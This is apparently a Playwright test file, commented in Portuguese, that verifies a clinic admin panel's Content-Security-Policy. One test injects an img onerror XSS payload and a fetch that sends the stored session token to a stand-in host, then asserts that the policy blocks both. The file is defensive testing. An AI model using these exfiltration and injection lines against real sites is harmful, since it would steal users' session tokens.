import type { Page } from '@playwright/test';
import { expect, openMenu, signIn, test } from '../support/fixtures';

/**
 * ADR-0067 (A-17) — Content-Security-Policy do painel, no navegador de
 * verdade e no build de produção. Os tokens de sessão ficam no localStorage:
 * a política impede que um script injetado rode e que os tokens saiam por
 * `fetch` para outro endereço. E nenhuma tela do painel pode ser barrada por
 * ela.
 */

interface Violation {
  directive: string;
  blocked: string;
}

/** Registra, desde antes do primeiro script da página, toda violação da política. */
async function recordViolations(page: Page): Promise<void> {
  await page.addInitScript(() => {
    const store: Violation[] = [];
    (window as unknown as { __violations: Violation[] }).__violations = store;
    document.addEventListener('securitypolicyviolation', (event) => {
      store.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
    });
  });
}

const violations = (page: Page) => page.evaluate(() => (window as unknown as { __violations: Violation[] }).__violations);

test.describe('Segurança do painel', () => {
  test('cada página vem com a política e um nonce novo, sem script inline nem eval permitidos', async ({ page }) => {
    const first = await page.goto('/login');
    const second = await page.goto('/login');
    const policy = first?.headers()['content-security-policy'] ?? '';
    const again = second?.headers()['content-security-policy'] ?? '';

    const scriptSrc = policy.split(';').find((part) => part.trim().startsWith('script-src')) ?? '';
    expect(scriptSrc.trim()).toMatch(/^script-src 'self' 'nonce-[A-Za-z0-9+/=]+' 'strict-dynamic'$/);
    expect(policy).not.toContain("'unsafe-eval'");
    expect(policy).toContain("connect-src 'self' http://localhost:");
    expect(policy).toContain("frame-ancestors 'none'");
    expect(again).not.toBe(policy);
  });

  test('o painel inteiro funciona sob a política: nenhuma violação ao entrar e navegar', async ({ page, clinic }) => {
    await recordViolations(page);
    await signIn(page, clinic.admin);
    for (const menu of ['Agenda', 'Pacientes', 'Financeiro', 'Notificações', 'Configurações', 'Usuários', 'Dashboard']) {
      await openMenu(page, menu);
    }
    await page.reload();
    await expect(page.getByRole('navigation', { name: 'Principal' })).toBeVisible();
    expect(await violations(page)).toEqual([]);
  });

  test('script injetado na página não roda, e os tokens não saem por fetch para outro endereço', async ({ page, clinic }) => {
    await recordViolations(page);
    await signIn(page, clinic.admin);

    // O vetor típico de XSS: HTML vindo de fora parar na página com um atributo
    // de evento. (Um <script> criado pelo próprio page.evaluate não serve de
    // prova: o Playwright avalia com a confiança do DevTools.)
    const ran = await page.evaluate(async () => {
      const holder = document.createElement('div');
      holder.innerHTML = '<img src="/arquivo-que-nao-existe.png" onerror="window.__injetado = true">';
      document.body.appendChild(holder);
      await new Promise((resolve) => setTimeout(resolve, 1000));
      return (window as unknown as { __injetado?: boolean }).__injetado === true;
    });
    expect(ran).toBe(false);

    const sent = await page.evaluate(async () => {
      try {
        await fetch('http://127.0.0.1:9/coleta', { method: 'POST', body: localStorage.getItem('luxora-auth-storage') });
        return 'enviado';
      } catch {
        return 'bloqueado';
      }
    });
    expect(sent).toBe('bloqueado');

    await expect
      .poll(async () => (await violations(page)).map((v) => v.directive).sort())
      .toEqual(['connect-src', 'script-src-attr']);
    expect((await violations(page)).find((v) => v.directive === 'connect-src')?.blocked).toContain('127.0.0.1:9');
  });
});
